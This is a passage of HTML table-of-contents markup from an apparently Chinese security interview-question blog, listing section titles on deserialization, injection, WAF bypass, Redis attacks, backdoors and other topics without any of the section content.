class="toc-number">2.19.1.</span> <span class="toc-text">示例代码：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B1%87%E7%BC%96%E4%BB%A3%E7%A0%81%EF%BC%88x86-64%EF%BC%89%EF%BC%9A"><span class="toc-number">2.19.2.</span> <span class="toc-text">汇编代码（x86_64）：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E7%A8%8B%E5%BA%8F%E7%9A%84%E7%BC%96%E8%AF%91%E5%92%8C%E9%93%BE%E6%8E%A5"><span class="toc-number">2.20.</span> <span class="toc-text">4. 程序的编译和链接</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B%EF%BC%9A"><span class="toc-number">2.20.1.</span> <span class="toc-text">编译过程：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B%E4%BB%A3%E7%A0%81%EF%BC%9A-3"><span class="toc-number">2.20.2.</span> <span class="toc-text">示例代码：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BC%96%E8%AF%91%E5%92%8C%E9%93%BE%E6%8E%A5%E5%91%BD%E4%BB%A4%EF%BC%9A"><span class="toc-number">2.20.3.</span> <span class="toc-text">编译和链接命令：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%EF%BC%9A"><span class="toc-number">2.20.4.</span> <span class="toc-text">编译原理：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#If-Else%E8%AF%AD%E6%B3%95%E6%A0%91%EF%BC%9A"><span class="toc-number">2.20.5.</span> <span class="toc-text">If&#x2F;Else语法树：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-Linux-proc%E7%9B%AE%E5%BD%95%E5%92%8C%E6%9F%A5%E7%9C%8B%E8%BF%9B%E7%A8%8B%E6%89%93%E5%BC%80%E7%9A%84%E6%96%87%E4%BB%B6"><span class="toc-number">2.21.</span> <span class="toc-text">5. Linux &#x2F;proc目录和查看进程打开的文件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E8%BF%9B%E7%A8%8B%E6%89%93%E5%BC%80%E7%9A%84%E6%96%87%E4%BB%B6%EF%BC%9A"><span class="toc-number">2.21.1.</span> <span class="toc-text">查看进程打开的文件：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B%E4%BB%A3%E7%A0%81%EF%BC%9A-4"><span class="toc-number">2.21.2.</span> <span class="toc-text">示例代码：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-SGD%E5%92%8CAdam%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">2.22.</span> <span class="toc-text">6. SGD和Adam的区别</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SGD%EF%BC%88%E9%9A%8F%E6%9C%BA%E6%A2%AF%E5%BA%A6%E4%B8%8B%E9%99%8D%EF%BC%89%EF%BC%9A"><span class="toc-number">2.22.1.</span> <span class="toc-text">SGD（随机梯度下降）：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Adam%EF%BC%88Adaptive-Moment-Estimation%EF%BC%89%EF%BC%9A"><span class="toc-number">2.22.2.</span> <span class="toc-text">Adam（Adaptive Moment Estimation）：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B%E4%BB%A3%E7%A0%81%EF%BC%88PyTorch%EF%BC%89%EF%BC%9A"><span class="toc-number">2.22.3.</span> <span class="toc-text">示例代码（PyTorch）：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Adam%E6%9B%B4%E6%96%B0%E8%A7%84%E5%88%99%EF%BC%9A"><span class="toc-number">2.22.4.</span> <span class="toc-text">Adam更新规则：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86%E5%92%8C%E5%B7%A5%E5%85%B7"><span class="toc-number">2.23.</span> <span class="toc-text">Java反序列化原理和工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B7%A5%E5%85%B7%E7%9A%84%E5%8E%9F%E7%90%86"><span class="toc-number">2.24.</span> <span class="toc-text">Shiro反序列化工具的原理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E5%91%98"><span class="toc-number">3.</span> <span class="toc-text">安全研究员</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF%E7%9A%84%E7%BB%95%E8%BF%87%E5%92%8C%E9%98%B2%E5%BE%A1"><span class="toc-number">3.1.</span> <span class="toc-text">SSRF的绕过和防御</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SSRF%E7%BB%95%E8%BF%87"><span class="toc-number">3.1.1.</span> <span class="toc-text">SSRF绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SSRF%E9%98%B2%E5%BE%A1"><span class="toc-number">3.1.2.</span> <span class="toc-text">SSRF防御</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Fastjson%E5%92%8CJackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86"><span class="toc-number">3.2.</span> <span class="toc-text">Fastjson和Jackson反序列化原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Fastjson"><span class="toc-number">3.2.1.</span> <span class="toc-text">Fastjson</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Jackson"><span class="toc-number">3.2.2.</span> <span class="toc-text">Jackson</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BCEL%E5%8F%AF%E4%BB%A5%E7%94%A8%E5%85%B6%E4%BB%96%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%90%97"><span class="toc-number">3.3.</span> <span class="toc-text">BCEL可以用其他类加载器吗</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">3.4.</span> <span class="toc-text">XStream反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RMI%E5%8E%9F%E7%90%86%E4%BB%A5%E5%8F%8A%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.5.</span> <span class="toc-text">RMI原理以及相关漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#RMI%E5%8E%9F%E7%90%86"><span class="toc-number">3.5.1.</span> <span class="toc-text">RMI原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#RMI%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.5.2.</span> <span class="toc-text">RMI漏洞</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JdbcRowSetImpl%E5%A6%82%E4%BD%95%E8%A7%A6%E5%8F%91JNDI%E6%B3%A8%E5%85%A5"><span class="toc-number">3.6.</span> <span class="toc-text">JdbcRowSetImpl如何触发JNDI注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%95%BF%E4%BA%AD%E7%A7%91%E6%8A%80"><span class="toc-number">4.</span> <span class="toc-text">长亭科技</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MySQL-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%B8%B8%E7%94%A8%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-number">4.1.</span> <span class="toc-text">MySQL 报错注入常用的函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87-WAF"><span class="toc-number">4.2.</span> <span class="toc-text">报错注入绕过 WAF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MySQL-%E5%86%99%E6%96%87%E4%BB%B6%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-number">4.3.</span> <span class="toc-text">MySQL 写文件的函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MySQL-%E6%8F%90%E6%9D%83"><span class="toc-number">4.4.</span> <span class="toc-text">MySQL 提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL-Server-%E9%99%A4%E4%BA%86-SQL-%E6%B3%A8%E5%85%A5%E5%A4%96%E7%9A%84%E6%B8%97%E9%80%8F%E6%96%B9%E5%BC%8F"><span class="toc-number">4.5.</span> <span class="toc-text">SQL Server 除了 SQL 注入外的渗透方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Redis-%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.6.</span> <span class="toc-text">Redis 主从复制漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Redis-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%A6%82%E4%BD%95%E8%8E%B7%E5%BE%97%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9D%83%E9%99%90"><span class="toc-number">4.7.</span> <span class="toc-text">Redis 未授权访问如何获得服务器权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%EF%BC%8C%E4%B8%80%E8%88%AC%E8%AF%BB%E5%8F%96%E4%BB%80%E4%B9%88%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%96%87%E4%BB%B6"><span class="toc-number">4.8.</span> <span class="toc-text">任意文件读取，一般读取什么类型的文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E9%80%9A%E8%BF%87%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E8%8E%B7%E5%8F%96%E5%88%B0-Web-%E7%9A%84%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84"><span class="toc-number">4.9.</span> <span class="toc-text">如何通过文件读取获取到 Web 的绝对路径</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#etc-passwd-%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9"><span class="toc-number">4.10.</span> <span class="toc-text">&#x2F;etc&#x2F;passwd 文件内容</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B%EF%BC%9A"><span class="toc-number">4.10.1.</span> <span class="toc-text">示例：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86%E5%92%8C%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">4.11.</span> <span class="toc-text">正向代理和反向代理的区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Python-%E6%98%AF%E5%90%A6%E6%98%AF%E7%9C%9F%E6%AD%A3%E7%9A%84%E5%A4%9A%E7%BA%BF%E7%A8%8B"><span class="toc-number">4.12.</span> <span class="toc-text">Python 是否是真正的多线程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B%E4%BB%A3%E7%A0%81%EF%BC%9A-5"><span class="toc-number">4.12.1.</span> <span class="toc-text">示例代码：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%92%8C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3%E7%9A%84-HTTP-%E5%93%8D%E5%BA%94%E5%A4%B4"><span class="toc-number">4.13.</span> <span class="toc-text">和信息安全相关的 HTTP 响应头</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WebLogic-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86"><span class="toc-number">4.14.</span> <span class="toc-text">WebLogic 反序列化原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC%E7%9B%B8%E5%85%B3%E5%8E%9F%E7%90%86"><span class="toc-number">4.15.</span> <span class="toc-text">内存马相关原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B%E4%BB%A3%E7%A0%81%EF%BC%9A-6"><span class="toc-number">4.15.1.</span> <span class="toc-text">示例代码：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Shiro-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%97%B6%E7%9A%84-WAF-%E7%BB%95%E8%BF%87"><span class="toc-number">4.16.</span> <span class="toc-text">Shiro 反序列化漏洞利用时的 WAF 绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B%E4%BB%A3%E7%A0%81%EF%BC%9A-7"><span class="toc-number">4.16.1.</span> <span class="toc-text">示例代码：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ysoserial-%E5%8E%9F%E7%90%86%E5%92%8C-CommonCollections-%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">4.17.</span> <span class="toc-text">ysoserial 原理和 CommonCollections 利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B%E4%BB%A3%E7%A0%81%EF%BC%9A-8"><span class="toc-number">4.17.1.</span> <span class="toc-text">示例代码：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java%E3%80%81PHP%E3%80%81Python-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%8C%BA%E5%88%AB%E5%92%8C%E7%9B%B8%E5%90%8C%E7%82%B9"><span class="toc-number">4.18.</span> <span class="toc-text">Java、PHP、Python 反序列化的区别和相同点</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">4.18.1.</span> <span class="toc-text">Java 反序列化</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">4.18.2.</span> <span class="toc-text">PHP 反序列化</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Python-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">4.18.3.</span> <span class="toc-text">Python 反序列化</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86"><span class="toc-number">4.19.</span> <span class="toc-text">宽字节注入原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Log4j-%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87-trustcodebase"><span class="toc-number">4.20.</span> <span class="toc-text">Log4j 如何绕过 trustcodebase</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Springboot-Shiro-%E7%8E%AF%E5%A2%83%E5%A6%82%E4%BD%95%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F"><span class="toc-number">4.21.</span> <span class="toc-text">Springboot+Shiro 环境如何进行渗透</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E6%88%98%E4%B8%AD%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD-Fastjson-%E7%9A%84%E7%89%88%E6%9C%AC"><span class="toc-number">4.22.</span> <span class="toc-text">实战中如何判断 Fastjson 的版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Fastjson-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99-gadget"><span class="toc-number">4.23.</span> <span class="toc-text">Fastjson 文件读写 gadget</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC%E7%B1%BB%E5%9E%8B%EF%BC%8C%E5%A6%82%E4%BD%95%E6%A3%80%E6%B5%8B"><span class="toc-number">4.24.</span> <span class="toc-text">内存马类型，如何检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Spring4Shell-%E5%8E%9F%E7%90%86%E3%80%81%E6%A3%80%E6%B5%8B%E4%B8%8E%E5%88%A9%E7%94%A8"><span class="toc-number">4.25.</span> <span class="toc-text">Spring4Shell 原理、检测与利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">4.25.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A3%80%E6%B5%8B"><span class="toc-number">4.25.2.</span> <span class="toc-text">检测</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">4.25.3.</span> <span class="toc-text">利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E5%8D%93%E7%B3%BB%E7%BB%9F%E5%A6%82%E4%BD%95%E8%BF%9B%E8%A1%8C-RCE"><span class="toc-number">4.26.</span> <span class="toc-text">安卓系统如何进行 RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">4.26.1.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B"><span class="toc-number">4.26.2.</span> <span class="toc-text">示例</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A7%BB%E5%8A%A8%E7%AB%AF-App-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%98%AF-Cloud-%E7%8E%AF%E5%A2%83%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="toc-number">4.27.</span> <span class="toc-text">移动端 App 服务端是 Cloud 环境的利用思路</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B-1"><span class="toc-number">4.27.1.</span> <span class="toc-text">示例</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Shiro-%E5%A6%82%E4%BD%95%E7%BB%95-WAF"><span class="toc-number">4.28.</span> <span class="toc-text">Shiro 如何绕 WAF</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF-1"><span class="toc-number">4.28.1.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B-2"><span class="toc-number">4.28.2.</span> <span class="toc-text">示例</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Weblogic-%E6%89%93%E7%AB%99%E9%81%87%E5%88%B0-WAF-%E7%9A%84%E6%93%8D%E4%BD%9C"><span class="toc-number">4.29.</span> <span class="toc-text">Weblogic 打站遇到 WAF 的操作</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF-2"><span class="toc-number">4.29.1.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B-3"><span class="toc-number">4.29.2.</span> <span class="toc-text">示例</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Jboss-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86"><span class="toc-number">4.30.</span> <span class="toc-text">Jboss 反序列化原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-1"><span class="toc-number">4.30.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-1"><span class="toc-number">4.30.2.</span> <span class="toc-text">利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Redis-%E6%94%BB%E5%87%BB%E3%80%81%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6%E5%8F%8A%E5%8E%9F%E7%90%86"><span class="toc-number">4.31.</span> <span class="toc-text">Redis 攻击、主从复制利用条件及原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95"><span class="toc-number">4.31.1.</span> <span class="toc-text">攻击方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E5%8E%9F%E7%90%86"><span class="toc-number">4.31.2.</span> <span class="toc-text">主从复制原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-2"><span class="toc-number">4.31.3.</span> <span class="toc-text">利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TCP-%E5%92%8C-UDP-%E4%B8%8D%E5%87%BA%E7%BD%91%E7%9A%84%E4%BB%A3%E7%90%86%E7%AD%96%E7%95%A5"><span class="toc-number">4.32.</span> <span class="toc-text">TCP 和 UDP 不出网的代理策略</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AD%96%E7%95%A5"><span class="toc-number">4.32.1.</span> <span class="toc-text">策略</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B-4"><span class="toc-number">4.32.2.</span> <span class="toc-text">示例</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%99%BE%E5%BA%A6"><span class="toc-number">5.</span> <span class="toc-text">百度</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JSONP-%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-number">5.1.</span> <span class="toc-text">JSONP 原理及绕过方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#JSONP-%E5%8E%9F%E7%90%86"><span class="toc-number">5.1.1.</span> <span class="toc-text">JSONP 原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JSONP-%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-number">5.1.2.</span> <span class="toc-text">JSONP 绕过方法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DOM%E5%9E%8BXSS%E6%89%AB%E6%8F%8F%E5%99%A8%E7%BC%96%E5%86%99"><span class="toc-number">5.2.</span> <span class="toc-text">DOM型XSS扫描器编写</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF"><span class="toc-number">5.2.1.</span> <span class="toc-text">基本思路</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E6%AD%A5%E9%AA%A4"><span class="toc-number">5.2.2.</span> <span class="toc-text">实现步骤</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux%E4%B8%BB%E6%9C%BA%E7%95%99%E5%90%8E%E9%97%A8%E7%9A%84%E5%90%84%E7%A7%8D%E6%96%B9%E5%BC%8F"><span class="toc-number">5.3.</span> <span class="toc-text">Linux主机留后门的各种方式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-number">5.3.1.</span> <span class="toc-text">计划任务</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%87%AA%E5%90%AF%E5%8A%A8%E5%90%8E%E9%97%A8"><span class="toc-number">5.3.2.</span> <span class="toc-text">自启动后门</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Webshell"><span class="toc-number">5.3.3.</span> <span class="toc-text">Webshell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E6%B3%A8%E5%86%8C%E8%A1%A8%EF%BC%88Windows%EF%BC%89"><span class="toc-number">5.3.4.</span> <span class="toc-text">写注册表（Windows）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DNS%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA%E6%96%B9%E5%BC%8F"><span class="toc-number">5.4.</span> <span class="toc-text">DNS隧道搭建方式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86"><span class="toc-number">5.4.1.</span> <span class="toc-text">基本原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E6%AD%A5%E9%AA%A4-1"><span class="toc-number">5.4.2.</span> <span class="toc-text">实现步骤</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A5%87%E5%AE%89%E4%BF%A1"><span class="toc-number">6.</span> <span class="toc-text">奇安信</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL-%E6%B3%A8%E5%85%A5%E5%86%99%E9%A9%AC%E7%9A%84%E6%96%B9%E5%BC%8F"><span class="toc-number">6.1.</span> <span class="toc-text">SQL 注入写马的方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Oracle-%E6%B3%A8%E5%85%A5%E7%9A%84%E7%9B%B4%E6%8E%A5%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">6.2.</span> <span class="toc-text">Oracle 注入的直接利用方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL-Server-%E8%8E%B7%E5%8F%96-shell-%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">6.3.</span> <span class="toc-text">SQL Server 获取 shell 的方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F"><span class="toc-number">6.4.</span> <span class="toc-text">同源策略的绕过方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E5%9F%BA%E4%BA%8E%E8%AF%AD%E4%B9%89%E6%A3%80%E6%B5%8B%E7%9A%84-WAF"><span class="toc-number">6.5.</span> <span class="toc-text">绕过基于语义检测的 WAF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%84%E7%BC%96%E8%AF%91%E5%9C%BA%E6%99%AF%E4%B8%8B%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8-SQL-%E6%B3%A8%E5%85%A5"><span class="toc-number">6.6.</span> <span class="toc-text">预编译场景下是否存在 SQL 注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CDN-%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F"><span class="toc-number">6.7.</span> <span class="toc-text">CDN 的绕过方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BF%AB%E6%89%8B"><span class="toc-number">7.</span> <span class="toc-text">快手</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-SQL%E9%97%AE%E9%A2%98%EF%BC%9A%E5%A6%82%E4%BD%95%E5%8F%96%E5%9C%A8A%E4%B8%AD%E4%BD%86%E4%B8%8D%E5%9C%A8B%E4%B8%AD%E7%9A%84%E6%95%B0%E6%8D%AE"><span class="toc-number">7.1.</span> <span class="toc-text">1. SQL问题：如何取在A中但不在B中的数据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%9C%89%E5%A0%A1%E5%9E%92%E6%9C%BA%E6%80%8E%E4%B9%88%E5%8A%9E%EF%BC%9F"><span class="toc-number">7.2.</span> <span class="toc-text">2. 有堡垒机怎么办？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%A2%ABban-IP%E6%80%8E%E4%B9%88%E5%8A%9E%EF%BC%9F"><span class="toc-number">7.3.</span> <span class="toc-text">3. 被ban IP怎么办？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E7%99%BB%E5%BD%95%E5%81%9A%E4%BA%86%E5%8F%8C%E5%9B%A0%E7%B4%A0%E8%AE%A4%E8%AF%81%E6%80%8E%E4%B9%88%E5%8A%9E%EF%BC%9F"><span class="toc-number">7.4.</span> <span class="toc-text">4. 登录做了双因素认证怎么办？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-VPN%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%B2%A1%E7%BB%91%E5%AE%9A%E6%9C%BA%E5%99%A8%E7%BC%96%E7%A0%81%EF%BC%88%E8%AF%81%E4%B9%A6%EF%BC%89%E5%90%97%EF%BC%9F"><span class="toc-number">7.5.</span> <span class="toc-text">5. 